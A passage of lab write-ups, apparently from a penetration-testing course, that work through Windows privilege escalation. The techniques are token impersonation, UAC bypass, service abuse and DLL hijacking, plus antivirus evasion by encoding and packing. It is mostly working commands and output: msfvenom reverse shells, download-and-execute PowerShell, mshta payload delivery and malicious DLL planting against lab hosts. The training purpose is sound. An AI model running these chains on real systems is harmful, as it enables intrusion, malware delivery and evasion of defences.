[*] Migrating from 4596 to 4248...
[-] Error running command migrate: Rex::RuntimeError Cannot migrate into this process (insufficient privileges)
```

`ps -S w3wp.exe`:
```
Filtering on 'w3wp.exe'

Process List
============

 PID   PPID  Name      Arch  Session  User                        Path
 ---   ----  ----      ----  -------  ----                        ----
 4664  2668  w3wp.exe  x64   0        IIS APPPOOL\DefaultAppPool  C:\Windows\System32\inetsrv\w3wp.exe
```

`migrate 4664`:
```
[*] Migrating from 4596 to 4664...
[*] Migration completed successfully. ←
```

**Step 11**.

`sysinfo`:
```
Computer        : DOTNETGOAT
OS              : Windows 2016+ (10.0 Build 17763). ←
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x64/windows
```

`getuid`:
```
Server username: IIS APPPOOL\DefaultAppPool
```

`getsystem`:
```
[-] priv_elevate_getsystem: Operation failed: Access is denied. The following was attempted:
[-] Named Pipe Impersonation (In Memory/Admin)
[-] Named Pipe Impersonation (Dropper/Admin)
[-] Token Duplication (In Memory/Admin)
[-] Named Pipe Impersonation (RPCSS variant)
```

`sessions -i 1`, `shell`, `whoami /all`:
```
USER INFORMATION
----------------

User Name                  SID                                                          
========================== =============================================================
iis apppool\defaultapppool S-1-5-82-3006700770-424185619-1745488364-794895919-4004696415


GROUP INFORMATION
-----------------
Group Name                           Type             SID          Attributes                                        
==================================== ================ ============ ==================================================
Mandatory Label\High Mandatory Level Label            S-1-16-12288                                                   
Everyone                             Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                        Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\SERVICE                 Well-known group S-1-5-6      Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                        Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users     Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization       Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
BUILTIN\IIS_IUSRS                    Alias            S-1-5-32-568 Mandatory group, Enabled by default, Enabled group
LOCAL                                Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
                                     Unknown SID type S-1-5-82-0   Mandatory group, Enabled by default, Enabled group


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled ←
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

**Step 12**.

Now, let's load the `incognito` plugin and check if any high privilege user's tokens are present. 

`load incognito`, `list_tokens -u`:
```
[-] Warning: Not currently running as SYSTEM, not all tokens will be available
             Call rev2self if primary process token is SYSTEM

Delegation Tokens Available
========================================
IIS APPPOOL\DefaultAppPool

Impersonation Tokens Available
========================================
DOTNETGOAT\Administrator ←
NT AUTHORITY\IUSR
```

Impersonate the administrator user token to escalate the current privilege. 

`impersonate_token "DOTNETGOAT\\Administrator"`:
```
[-] Warning: Not currently running as SYSTEM, not all tokens will be available
             Call rev2self if primary process token is SYSTEM
[-] No delegation token available
[+] Successfully impersonated user DOTNETGOAT\Administrator ←
```

`getuid`:
```
Server username: DOTNETGOAT\Administrator ←
```

`getsystem`:
```
...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).
```

`getuid`:
```
Server username: NT AUTHORITY\SYSTEM ←
```

---

### Privilege Escalation - Lab

In this lab, you will learn to find and exploit a vulnerable application to practice different privilege escalation techniques.

In this lab environment, the user will get access to a Kali GUI instance. A vulnerable application can be accessed using the tools installed on Kali on http://demo.ine.local.

Objective: Perform privilege escalation through Metasploit module and manually.

The best tools for this lab are:
- Metasploit Framework
- Nmap

---

Perform privilege escalation through Metasploit module:

`ping demo.ine.local -c 3`:
```
PING demo.ine.local (10.4.16.166) 56(84) bytes of data.
64 bytes from demo.ine.local (10.4.16.166): icmp_seq=1 ttl=125 time=9.33 ms
64 bytes from demo.ine.local (10.4.16.166): icmp_seq=2 ttl=125 time=9.16 ms
64 bytes from demo.ine.local (10.4.16.166): icmp_seq=3 ttl=125 time=9.14 ms

--- demo.ine.local ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2003ms
rtt min/avg/max/mdev = 9.137/9.208/9.329/0.085 ms
```

`nmap -sS demo.ine.local`:
```
Starting Nmap 7.92 ( https://nmap.org ) at 2024-02-09 15:38 IST
Nmap scan report for demo.ine.local (10.4.16.166)
Host is up (0.010s latency).
Not shown: 990 closed tcp ports (reset)
PORT      STATE SERVICE
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49165/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 1.47 seconds
```

`nmap -sV -Pn demo.ine.local -p80,135,139,445,3389`:
```
Starting Nmap 7.92 ( https://nmap.org ) at 2024-02-09 15:41 IST
Nmap scan report for demo.ine.local (10.4.16.166)
Host is up (0.0094s latency).

PORT     STATE SERVICE            VERSION
80/tcp   open  http               HttpFileServer httpd 2.3
135/tcp  open  msrpc              Microsoft Windows RPC
139/tcp  open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds       Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
3389/tcp open  ssl/ms-wbt-server?
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 66.20 seconds
```

`msfconsole`, `search hfs`, `unset PAYLOAD`, `set windows/x64/meterpreter/reverse_tcp`, `show options`, `set RHOSTS demo.ine.local`, `exploit`.

`sysinfo`:
```
Computer        : VICTIM
OS              : Windows 2012 R2 (6.3 Build 9600).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x64/windows
```

`getuid`:
```
Server username: VICTIM\admin
```

`shell`, `net localgroup "administrators"`:
```
Alias name     administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
admin
Administrator
The command completed successfully.
```

`getsystem`:
```
[-] priv_elevate_getsystem: Operation failed: Access is denied. The following was attempted:
[-] Named Pipe Impersonation (In Memory/Admin)
[-] Named Pipe Impersonation (Dropper/Admin)
[-] Token Duplication (In Memory/Admin)
[-] Named Pipe Impersonation (RPCSS variant)`
```

`background`, `search win_privs`, `run post/windows/gather/win_privs`:
```
Current User
============

 Is Admin  Is System  Is In Local Admin Group  UAC Enabled  Foreground ID  UID
 --------  ---------  -----------------------  -----------  -------------  ---
 False     False      True                     True         1              VICTIM\admin

Windows Privileges
==================

 Name
 ----
 SeChangeNotifyPrivilege
 SeIncreaseWorkingSetPrivilege
 SeShutdownPrivilege
 SeTimeZonePrivilege
 SeUndockPrivilege
```

`background`, `search bypassuac`, `use exploit/windows/local/bypassuac_vbs`, `unset PAYLOAD`, `set PAYLOAD windows/X64/meterpreter/reverse_tcp`, `show options`, `set SESSION 1`, `show targets`, `exploit`:
```
[*] Started reverse TCP handler on 10.10.22.3:4444 
[-] Exploit aborted due to failure: not-vulnerable: Windows 2012 R2 (6.3 Build 9600). is not vulnerable.
[*] Exploit completed, but no session was created.
```

`search exploit_suggester`, `use post/multi/recon/local_exploit_suggester`, `show options`, `set SESSION 1`, `exploit`:
```
[*] 10.4.16.166 - Collecting local exploits for x64/windows...
[*] 10.4.16.166 - 30 exploit checks are being tried...
[+] 10.4.16.166 - exploit/windows/local/bypassuac_dotnet_profiler: The target appears to be vulnerable.
[+] 10.4.16.166 - exploit/windows/local/bypassuac_injection: The target appears to be vulnerable.
[+] 10.4.16.166 - exploit/windows/local/bypassuac_sdclt: The target appears to be vulnerable.
[*] Post module execution completed
```

`search bypassuac`, `use exploit/windows/local/bypassuac_injection`, `unset PAYLOAD`, `set PAYLOAD windows/x64/meterpreter/reverse_tcp`, `show options`, `set SESSION 1`, `show targets`, `set TARGET 1`, `exploit`:
```
[*] Started reverse TCP handler on 10.10.22.3:4444 
[+] Windows 2012 R2 (6.3 Build 9600). may be vulnerable.
[*] UAC is Enabled, checking level...
[+] Part of Administrators group! Continuing...
[+] UAC is set to Default
[+] BypassUAC can bypass this setting, continuing...
[*] Uploading the Payload DLL to the filesystem...
[*] Spawning process with Windows Publisher Certificate, to inject into...
[+] Successfully injected payload in to process: 2296
[*] Sending stage (200262 bytes) to 10.4.16.166
```

`sessions`, `sessions -i 2`, `getuid`:
```
Server username: VICTIM\admin
```

`getsystem`, `getuid`:
```
Server username: NT AUTHORITY\SYSTEM
```

`background`, `serch win_privs`, `sessions -i 2`, `run post/windows/gather/win_privs`:
```
Current User
============

 Is Admin  Is System  Is In Local Admin Group  UAC Enabled  Foreground ID  UID
 --------  ---------  -----------------------  -----------  -------------  ---
 True      True       True                     False        1              NT AUTHORITY\SYSTEM

Windows Privileges
==================

 Name
 ----
 SeBackupPrivilege
 SeChangeNotifyPrivilege
 SeCreateGlobalPrivilege
 SeCreatePagefilePrivilege
 SeCreateSymbolicLinkPrivilege
 SeDebugPrivilege
 SeImpersonatePrivilege
 SeIncreaseBasePriorityPrivilege
 SeIncreaseQuotaPrivilege
 SeIncreaseWorkingSetPrivilege
 SeLoadDriverPrivilege
 SeManageVolumePrivilege
 SeProfileSingleProcessPrivilege
 SeRemoteShutdownPrivilege
 SeRestorePrivilege
 SeSecurityPrivilege
 SeShutdownPrivilege
 SeSystemEnvironmentPrivilege
 SeSystemProfilePrivilege
 SeSystemtimePrivilege
 SeTakeOwnershipPrivilege
 SeTimeZonePrivilege
 SeUndockPrivilege
```

---

Perform privilege escalation manually:

`ip addr | grep "inet"`:
```
inet 127.0.0.1/8 scope host lo
inet 10.1.0.26/16 brd 10.1.255.255 scope global eth0
inet 10.10.4.10/24 brd 10.10.4.255 scope global eth1
```

`background`, `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.4.10 LPORT=1234 -f exe -o /root/reverse_tcp64.exe`:
``` 
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of exe file: 7168 bytes
Saved as: /root/reverse_tcp64.exe
```

`search handler`, `use exploit/multi/handler`, `unset PAYLOAD`, `set PAYLOAD windows/x64/meterpreter/reverse_tcp`, `show options`, `set LHOST 10.10.4.10`, `set LPORT 1234`, `exploit -j`:
```
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.

[*] Started reverse TCP handler on 10.10.4.10:1234
```

`ls -l /root/Desktop/tools/UACME`:
```
total 196K
-rwxrwxrwx 1 root root 195K Jan 20  2022 Akagi64.exe
```

`sessions -i 1`, `pwd`, `dir`, `cd C:\\Users\\admin\\AppData\\Local\\Temp`, `upload /root/reverse_tcp64.exe .`, `upload /root/Desktop/tools/UACME/Akagi64.exe .`, `shell`, `dir`, `Akagi64.exe 10 C:\\Users\\admin\\AppData\\Local\\Temp\\reverse_tcp64.exe`.

`exit`, `background`, `sessions`, `sessions -i 2`, `getsystem`:
```
...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).
```

`getuid`:
```
Server username: NT AUTHORITY\SYSTEM
```

---

### Privilege Escalation Via Services - Lab

In this lab, you will learn to find and exploit a vulnerable application to practice different privilege escalation techniques.

In this lab environment, the user will get access to a Kali GUI instance. A vulnerable application can be accessed using the tools installed on Kali on http://demo.ine.local.

Objective: Perform privilege escalation through misconfigured service.

The best tools for this lab are:
- Metasploit Framework
- Nmap

---

**Step 1**.

`ping demo.ine.local -c 3`:
```
PING demo.ine.local (10.4.16.67) 56(84) bytes of data.
64 bytes from demo.ine.local (10.4.16.67): icmp_seq=1 ttl=125 time=10.4 ms
64 bytes from demo.ine.local (10.4.16.67): icmp_seq=2 ttl=125 time=9.41 ms
64 bytes from demo.ine.local (10.4.16.67): icmp_seq=3 ttl=125 time=9.43 ms

--- demo.ine.local ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2003ms ←
rtt min/avg/max/mdev = 9.410/9.750/10.415/0.470 ms
```

`nmap -sS -Pn demo.ine.local`:
```
Starting Nmap 7.92 ( https://nmap.org ) at 2024-02-09 20:21 IST
Nmap scan report for demo.ine.local (10.4.16.67)
Host is up (0.0096s latency).
Not shown: 989 closed tcp ports (reset)
PORT      STATE SERVICE
80/tcp    open  http ←
135/tcp   open  msrpc ←
139/tcp   open  netbios-ssn ←
445/tcp   open  microsoft-ds ←
3389/tcp  open  ms-wbt-server ←
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49156/tcp open  unknown
49175/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 1.44 seconds
```

**Step 2**.

`nmap -sV -Pn demo.ine.local -p80,135,139,445,3389`:
```
Starting Nmap 7.92 ( https://nmap.org ) at 2024-02-09 20:22 IST
Nmap scan report for demo.ine.local (10.4.16.67)
Host is up (0.011s latency).

PORT     STATE SERVICE            VERSION
80/tcp   open  http               BadBlue httpd 2.7 ←
135/tcp  open  msrpc              Microsoft Windows RPC
139/tcp  open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds       Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
3389/tcp open  ssl/ms-wbt-server?
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 66.24 seconds
```

**Step 3**.

`searchsploit badblue 2.7`:
```
[*] exec: searchsploit badblue 2.7

-------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                      |  Path
-------------------------------------------------------------------------------------------------------------------- ---------------------------------
BadBlue 2.72 - PassThru Remote Buffer Overflow                                                                      | windows/remote/4784.pl ←
BadBlue 2.72b - Multiple Vulnerabilities                                                                            | windows/remote/4715.txt
BadBlue 2.72b - PassThru Buffer Overflow (Metasploit)                                                               | windows/remote/16806.rb
-------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
```

`msfconsole -q`, `search badblue`, `use exploit/windows/http/badblue_passthru`, `set PAYLOAD windows/x64/meterpreter/reverse_tcp`, `set RHOSTS demo.ine.local`, `exploit -j`.

**Step 4**.

`ps -S explorer.exe`:
```
Filtering on 'explorer.exe'

Process List
============

 PID   PPID  Name          Arch  Session  User                 Path
 ---   ----  ----          ----  -------  ----                 ----
 2688  2680  explorer.exe  x64   1        WIN-I219UGQJ7H8\bob  C:\Windows\explorer.exe

```
`migrate 2688`.

**Step 5**.

`sysinfo`:
```
Computer        : WIN-I219UGQJ7H8
OS              : Windows 2012 R2 (6.3 Build 9600).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 1
Meterpreter     : x64/windows
```

`getuid`:
```
Server username: WIN-I219UGQJ7H8\bob ←
```

**Step 6**.

`getsystem`:
```
[-] priv_elevate_getsystem: Operation failed: Access is denied. The following was attempted:
[-] Named Pipe Impersonation (In Memory/Admin)
[-] Named Pipe Impersonation (Dropper/Admin)
[-] Token Duplication (In Memory/Admin)
[-] Named Pipe Impersonation (RPCSS variant)
```

**Step 7**.

`shell`, `net localgroup "administrators"`:
```
Alias name     administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator
The command completed successfully.
```

`exit`, `background`, `search win_privs`, `use post/windows/gather/win_privs`, `set SESSION 1`, `exploit`:
```
Current User
============

 Is Admin  Is System  Is In Local Admin Group  UAC Enabled  Foreground ID  UID
 --------  ---------  -----------------------  -----------  -------------  ---
 False     False      False                    True         1              WIN-I219UGQJ7H8\bob ←

Windows Privileges
==================

 Name
 ----
 SeChangeNotifyPrivilege
 SeIncreaseWorkingSetPrivilege
```

**Step 8A**.

`cd /root/Desktop/tools/PowerSploit/Privesc`, `ls -l`:
```
total 632
-rwxrwxrwx 1 root root  26768 Aug 18  2020 Get-System.ps1
-rwxrwxrwx 1 root root 600580 Aug 18  2020 PowerUp.ps1 ←
-rwxrwxrwx 1 root root   1659 Aug 18  2020 Privesc.psd1
-rwxrwxrwx 1 root root     67 Aug 18  2020 Privesc.psm1
-rwxrwxrwx 1 root root   4569 Aug 18  2020 README.md
```
`python -m SimpleHTTPServer 80`.

`sessions`, `sessions -i 1`, `load powershell`, `powershell_shell`.

To scan the host in order to find its privilege escalation vulnerabilities: `iex (New-Object Net.WebClient).DownloadString('http://10.10.22.6/PowerUp.ps1')`, `Invoke-AllChecks`:
```
ServiceName   : AppReadiness
Path          : C:\Windows\System32\svchost.exe -k AppReadiness
StartName     : LocalSystem
AbuseFunction : Invoke-ServiceAbuse -Name 'AppReadiness' ←
CanRestart    : True
Name          : AppReadiness
Check         : Modifiable Services

UnattendPath : C:\Windows\Panther\Unattend.xml
Name         : C:\Windows\Panther\Unattend.xml
Check        : Unattended Install Files
```

To abuse the "AppReadiness" Windows service in order to add the current user in the "Administrators" group:`Invoke-ServiceAbuse -Name 'AppReadiness' -Command "net localgroup administrators bob /add"`:
```
ServiceAbused                                               Command
-------------                                               -------
AppReadiness                                                net localgroup administrators bob /add ←
```

`net localgroup administrator`:
```
net localgroup administrators
Alias name     administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator
bob ←
The command completed successfully.
```

**Step 8B**.

But the preceding operation will generate many logs that could trigger doubt.

It is always a good idea to not touch the target machine settings and disk to achieve the goal.
In this case, we only want to escalate the privilege by abusing the "AppReadiness" service.
We can execute HTML Application (HTA) exploits and gain a new Meterpreter session. 

`background`, `search hta`, `use exploit/windows/misc/hta_server`, `unset PAYLOAD`, `set PAYLOAD windows/x64/meterpreter/reverse_tcp`, `show options`, `set LPORT 443`, `info`:
```
Description:
  This module hosts an HTML Application (HTA) that when opened will 
  run a payload via Powershell. When a user navigates to the HTA file 
  they will be prompted by IE twice before the payload is executed.
```
`set TARGET 1`, `exploit`:
```
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.

[*] Started reverse TCP handler on 10.10.23.6:443 
[*] Using URL: http://0.0.0.0:8080/D25qjYF2.hta
[*] Local IP: http://10.10.23.6:8080/D25qjYF2.hta
[*] Server started.
```

We have received a URL that serves the malicious .hta file.
We can invoke the file using the `mshta.exe` executable. It is by default available in all the Windows OSs.

`sessions -i 1`, `powershell_shell`, `iex (New-Object Net.WebClient).DownloadString('http://10.10.23.6/PowerUp.ps1')`, `Invoke-AllChecks`, `Invoke-ServiceAbuse -Name 'AppReadiness' -Command "mshta.exe http://10.10.23.6/D25qjYF2.hta"`:
```
[*] 10.4.21.238      hta_server - Delivering Payload

ServiceAbused                                               Command
-------------                                               -------
AppReadiness                                                mshta.exe http://10.10.23.6:8080/D25qjYF2.hta
```

---

### Finding and Exploiting DLL Hijacking Vulnerabilities - Lab 

In this lab, you will learn to conduct a manual analysis of an executable using Process Monitor on a Windows machine as a local administrator.

The objective is to discover DLL Hijacking vulnerability in an application.

A Kali GUI machine and a Windows machine are provided to you. Multi views for the Windows machine access have been given to you. 1. regular user (student) 2. administrator access is granted for application analysis.

Your task is to find the Hijackable DLL location from the vulnerable application installed on the windows machine. Run Process Monitor utility to identify the missing and Hijackable DLL locations in provided vulnerable application then perform privilege escalation or gain high privileged shell from a regular user (student) by planting a malicious DLL to the missing path.

Note: Use student machine for all the privilege escalation activities. The Administrator access is only given for analysis and running an application purpose.

DVTA Application Location: C:\Users\Administrator\Desktop\dvta\bin\Release\DVTA.exe

Objective: Gain access to administrator privilege meterpreter session.

The best tools for this lab are:
- Process Monitor
- Metasploit Framework

---

**Step 1**.

Processo Monitor Filters: 'Process Name is DVTA.exe', 'Operation is CreateFile', 'Result is NAME NOT FOUND', 'Path begins with C:\Users\Administrator'.

DLLs:
'C:\Users\Administrator\Desktop\dvta\bin\Release\VERSION.DLL', 'C:\Users\Administrator\Desktop\dvta\bin\Release\DWrite.dll'.

**Step 2**.

`Get-ACL 'C:\Users\Administrator\Desktop\dvta\bin\Release' | Format-List`:
```
Path   : Microsoft.PowerShell.Core\FileSystem::C:\Users\Administrator\Desktop\dvta\bin\Release\
Owner  : BUILTIN\Administrators
Group  : PRIVILEGE-ESCAL\None
Access : NT AUTHORITY\SYSTEM Allow  FullControl
         BUILTIN\Administrators Allow  FullControl
         PRIVILEGE-ESCAL\Administrator Allow  FullControl
         PRIVILEGE-ESCAL\student Allow  FullControl
         NT AUTHORITY\SYSTEM Allow  FullControl
         BUILTIN\Administrators Allow  FullControl
         PRIVILEGE-ESCAL\Administrator Allow  FullControl
Audit  :
Sddl   : O:BAG:S-1-5-21-419124378-3330503463-3778973392-513D:AI(A;OICI;FA;;;SY)(A;OICI;FA;;;BA)(A;OICI;FA;;;LA)(A;OICII
         D;FA;;;S-1-5-21-419124378-3330503463-3778973392-1008)(A;OICIID;FA;;;SY)(A;OICIID;FA;;;BA)(A;OICIID;FA;;;LA)
```

**Step 3**.

`systeminfo`:
```
Host Name:                 PRIVILEGE-ESCAL
OS Name:                   Microsoft Windows Server 2019 Datacenter
OS Version:                10.0.17763 N/A Build 17763
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          EC2
Registered Organization:   Amazon.com
Product ID:                00430-00000-00000-AA272
Original Install Date:     10/23/2020, 8:39:43 AM
System Boot Time:          2/12/2024, 2:38:08 PM
System Manufacturer:       Xen
System Model:              HVM domU
System Type:               x64-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: Intel64 Family 6 Model 79 Stepping 1 GenuineIntel ~2300 Mhz
BIOS Version:              Xen 4.11.amazon, 8/24/2006
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC) Coordinated Universal Time
Total Physical Memory:     8,192 MB
Available Physical Memory: 3,437 MB
Virtual Memory: Max Size:  10,112 MB
Virtual Memory: Available: 3,371 MB
Virtual Memory: In Use:    6,741 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    WORKGROUP
Logon Server:              \\PRIVILEGE-ESCAL
Hotfix(s):                 20 Hotfix(s) Installed.
                           [01]: KB4570720
                           [02]: KB4470502
                           [03]: KB4470788
                           [04]: KB4480056
                           [05]: KB4493510
                           [06]: KB4494174
                           [07]: KB4499728
                           [08]: KB4504369
                           [09]: KB4512577
                           [10]: KB4512937
                           [11]: KB4521862
                           [12]: KB4523204
                           [13]: KB4539571
                           [14]: KB4549947
                           [15]: KB4558997
                           [16]: KB4561600
                           [17]: KB4562562
                           [18]: KB4566424
                           [19]: KB4570332
                           [20]: KB4570333
Network Card(s):           1 NIC(s) Installed.
                           [01]: AWS PV Network Device
                                 Connection Name: Ethernet
                                 DHCP Enabled:    Yes
                                 DHCP Server:     10.4.16.1
                                 IP address(es)
                                 [01]: 10.4.29.250
                                 [02]: fe80::a55e:508a:f1e9:b9de
Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.
```

**Step 4**.

`ip addr | grep "inet"`.
`msfconsole -q`, `search multi handler`, `use exploit/multi/handler`, `set PAYLOAD windows/x64/meterpreter/reverse_tcp`, `show options`, `set LHOST 10.10.23.12`, `set LPORT 4444`, `exploit -j`.

`msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.23.12 LPORT=4444 -f dll -o /root/Desktop/reverse_tcp64.dll`.
`mv /root/Desktop/reverse_tcp64.dll /root/Desktop/DWrite.dll`.
`python -m SimpleHTTPServer 80`.

**Step 5**.

`iwr -UseBasicParsing -Uri http://10.10.23.12/DWrite.dll -OutFile C:\Users\Administrator\Desktop\dvta\bin\Release\DWrite.dll`.

**Step 6**.

`sysinfo`:
```
Computer        : PRIVILEGE-ESCAL
OS              : Windows 2016+ (10.0 Build 17763).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x86/windows
```

`getuid`:
```
Server username: PRIVILEGE-ESCAL\Administrator
```

---

### Bypassing AV - Lab

In this lab, you will learn to bypass one of the popular antiviruses, namely Avast.

In this lab environment, the user will get access to a Kali GUI instance. A Windows 7 machine can be accessed using the tools installed on Kali at IP address `172.16.5.10`.

Objective: Bypass the latest version of Avast AV.

Use the following credentials to connect to the Windows machine over RDP:
- Username: aline
- Password: soccer

The best tools for this lab are:
- Veil Framework
- UPX
- Metasploit Framework
- rdesktop
- A web browser

---

**Step 1**.

`ping 172.16.5.10 -c 3`:
```
PING 172.16.5.10 (172.16.5.10) 56(84) bytes of data.
64 bytes from 172.16.5.10: icmp_seq=1 ttl=128 time=0.823 ms
64 bytes from 172.16.5.10: icmp_seq=2 ttl=128 time=0.680 ms
64 bytes from 172.16.5.10: icmp_seq=3 ttl=128 time=0.987 ms

--- 172.16.5.10 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2047ms ←
rtt min/avg/max/mdev = 0.680/0.830/0.987/0.125 ms
```

`nmap -sS 172.16.5.10 -p3389`:
```
Starting Nmap 7.91 ( https://nmap.org ) at 2022-01-21 19:03 EST
Nmap scan report for 172.16.5.10
Host is up (0.00053s latency).

PORT     STATE SERVICE
3389/tcp open  ms-wbt-server
MAC Address: 08:00:27:7F:4F:D8 (Oracle VirtualBox virtual NIC) ←

Nmap done: 1 IP address (1 host up) scanned in 14.09 seconds
```

`rdesktop 172.16.5.10 -u aline -p soccer`.

**Step 2**.

`systeminfo`:
```
Host Name:                 IE8WIN7
OS Name:                   Microsoft Windows 7 Enterprise
OS Version:                6.1.7601 Service Pack 1 Build 7601
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Workstation
OS Build Type:             Multiprocessor Free
Registered Owner:
Registered Organization:   Microsoft
Product ID:                00392-972-8000024-85510
Original Install Date:     9/21/2015, 2:17:30 AM
System Boot Time:          1/21/2022, 4:00:33 PM
System Manufacturer:       innotek GmbH
System Model:              VirtualBox
System Type:               X86-based PC ←
Processor(s):              1 Processor(s) Installed.
                           [01]: x86 Family 6 Model 106 Stepping 6 GenuineI
BIOS Version:              innotek GmbH VirtualBox, 12/1/2006
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC-08:00) Pacific Time (US & Canada)
Total Physical Memory:     3,584 MB
Available Physical Memory: 1,845 MB
Virtual Memory: Max Size:  7,165 MB
Virtual Memory: Available: 5,785 MB
Virtual Memory: In Use:    1,380 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    WORKGROUP
Logon Server:              \\IE8WIN7
Hotfix(s):                 230 Hotfix(s) Installed.
                           [01]: KB2479943
                           [02]: KB2491683
                           [03]: KB2506212
                     	   ...
                           [230]: KB4054518
Network Card(s):           1 NIC(s) Installed.
                           [01]: Intel(R) PRO/1000 MT Desktop Adapter
                                 Connection Name: Local Area Connection 2
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 172.16.5.10
                                 [02]: fe80::34ec:2548:7d92:265f
```

**Step 3**.

`ip addr | grep "inet"`:
```
inet 127.0.0.1/8 scope host lo
inet6 ::1/128 scope host 
inet 192.168.0.3/24 brd 192.168.0.255 scope global adlab0
inet6 fe80::a00:27ff:fef9:76b6/64 scope link 
inet 172.16.5.101/24 brd 172.16.5.255 scope global eth1 ←
inet6 fe80::a00:27ff:fed4:ee5d/64 scope link 
```

`msfvenom -p windows/meterpreter/reverse_tcp LHOST=172.16.5.101 LPORT=4444 -f exe -o /root/Desktop/reverse_tcp.exe`.

`msfconsole -q`, `search multi handler`, `use exploit/multi/handler`, `set PAYLOAD windows/meterpreter/reverse_tcp`, `set LHOST 172.16.5.101`, `set LPORT 4444`, `exploit`.

`cd /root/Desktop`, `python -m SimpleHTTPServer 80`.

**Step 4**.

`(New-Object Net.WebClient).DownloadFile('http://172.16.5.101/reverse_tcp.exe', 'C:\Users\aline\Desktop\reverse_tcp.exe')`: to download the payload on the target machine.

But Avast AV blocked this file.

**Step 5**.

`msfvenom -p windows/meterpreter/reverse_tcp LHOST=172.16.5.101 LPORT=4444 -f exe -o /root/Desktop/reverse_tcp_encoded.exe -e x86/shikata_ga_nai -i 5`:
```
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 1 compatible encoders
Attempting to encode payload with 5 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 381 (iteration=0)
x86/shikata_ga_nai succeeded with size 408 (iteration=1)
x86/shikata_ga_nai succeeded with size 435 (iteration=2)
x86/shikata_ga_nai succeeded with size 462 (iteration=3)
x86/shikata_ga_nai succeeded with size 489 (iteration=4)
x86/shikata_ga_nai chosen with final size 489
Payload size: 489 bytes
Final size of exe file: 73802 bytes
Saved as: /root/Desktop/reverse_tcp_encoded.exe
```

`upx --best --ultra-brute -f reverse_tcp_encoded.exe -o reverse_tcp_encoded_upx.exe`:
```
                       Ultimate Packer for eXecutables
                          Copyright (C) 1996 - 2020
UPX 3.96        Markus Oberhumer, Laszlo Molnar & John Reiser   Jan 23rd 2020

        File size         Ratio      Format      Name
   --------------------   ------   -----------   -----------
